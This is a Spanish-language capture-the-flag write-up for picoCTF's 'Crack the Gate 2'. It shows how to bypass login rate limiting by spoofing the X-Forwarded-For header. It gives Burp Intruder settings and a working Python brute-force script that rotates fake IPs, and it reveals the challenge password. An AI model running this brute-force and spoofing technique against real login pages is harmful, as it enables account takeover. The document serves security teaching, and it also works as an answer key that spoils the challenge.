# Writeup: Crack_the_Gate2
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Writeup: Crack the Gate 2 (picoCTF)

Descripción del reto


El sistema de login ha sido mejorado con un mecanismo básico de limitación de tasa (rate limiting) que bloquea intentos fallidos repetidos desde una misma fuente. Sin embargo, el servidor confía en cabeceras controladas por el usuario, como X-Forwarded-For, para identificar la IP de origen. El objetivo es eludir la limitación y realizar un ataque de fuerza bruta a la contraseña del correo conocido ctf-player@picoctf.org para obtener la bandera.

Información proporcionada


```
    URL: http://amiable-citadel.picoctf.net:49664/

    Correo: ctf-player@picoctf.org

    Lista de contraseñas: passwords.txt (se asume un diccionario común)

    Código fuente (del HTML): El formulario envía una petición JSON POST a /login con {"email":"...","password":"..."}. En caso de éxito, el servidor responde con {"success":true, "flag":"..."}.

```

Vulnerabilidad


La limitación de tasa normalmente se implementa registrando la dirección IP del cliente. Si el servidor respeta la cabecera X-Forwarded-For (usada por proxies para indicar la IP original), un atacante puede falsificar esta cabecera con una IP diferente en cada intento. Así, cada petición parece provenir de una fuente distinta, evitando por completo el bloqueo.

### Solución paso a paso (con Burp Suite)

1. Capturar una petición de login

```
    Configura Burp Suite como proxy y navega a http://amiable-citadel.picoctf.net:49664/.

    Introduce credenciales falsas (por ejemplo, test@test.com / dummy) y envía el formulario.

    En el historial HTTP de Burp, localiza la petición POST /login.

```

Ejemplo de petición:

text


POST /login HTTP/1.1

Host: amiable-citadel.picoctf.net:49664

Content-Type: application/json

Content-Length: 56


{"email":"ctf-player@picoctf.org","password":"dummy"}


2. Enviar a Intruder

```
    Haz clic derecho sobre la petición → Send to Intruder.

    Ve a la pestaña Intruder.

```

3. Configurar las posiciones de los payloads

```
    En la pestaña Positions, haz clic en Clear § para borrar marcadores existentes.

    Añade dos marcadores:

        Campo de contraseña: Selecciona el valor "dummy" dentro del JSON y haz clic en Add § → quedará "password":"§dummy§".

        Cabecera X-Forwarded-For: Añade una nueva línea en las cabeceras:
        X-Forwarded-For: 60.60.60.§0§
        Luego selecciona el 0 y haz clic en Add §.

    Cambia el tipo de ataque a Pitchfork (empareja el primer payload con el segundo uno a uno).

```

4. Cargar los payloads

```
    Ve a la pestaña Payloads.

    Payload set 1 (contraseña):

        Tipo: Simple list

        Carga tu archivo passwords.txt (o añade manualmente contraseñas comunes como password, admin, picoctf, etc.).

    Payload set 2 (último octeto de la IP):

        Tipo: Numbers

        Rango: desde 1 hasta 254, paso 1.

        Formato: decimal.

```

5. Iniciar el ataque

```
    Haz clic en Start Attack.

    Burp enviará cada contraseña con un valor diferente de X-Forwarded-For (ej. 60.60.60.1, 60.60.60.2, …).

    Observa las respuestas. Un login exitoso devuelve {"success":true,...}.

```

6. Obtener la bandera

Cuando se encuentra la contraseña correcta, la respuesta incluye la bandera. En este caso, la contraseña era Xpseyq9h y la respuesta fue:

json


{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{******************}"}


Bandera final

text


picoCTF{*********************}


Método alternativo (script en Python)


También se puede usar un script sencillo que rota la cabecera X-Forwarded-For:

python


import requests

import random


url = "http://amiable-citadel.picoctf.net:49664/login"

email = "ctf-player@picoctf.org"

with open("passwords.txt") as f:

```
    passwords = f.read().splitlines()

```

for pwd in passwords:

```
    ip_spoof = f"60.60.60.{random.randint(1,254)}"
    headers = {"Content-Type": "application/json", "X-Forwarded-For": ip_spoof}
    data = {"email": email, "password": pwd}
    resp = requests.post(url, json=data, headers=headers)
    if resp.json().get("success"):
        print(f"Contraseña encontrada: {pwd}")
        print(f"Bandera: {resp.json()['flag']}")
        break

```

Conclusión


El reto demuestra la importancia de no confiar ciegamente en cabeceras proporcionadas por el cliente para la limitación de tasa. La solución consistió en falsificar X-Forwarded-For en cada intento de fuerza bruta, lo que permitió evitar el bloqueo y encontrar la contraseña correcta.

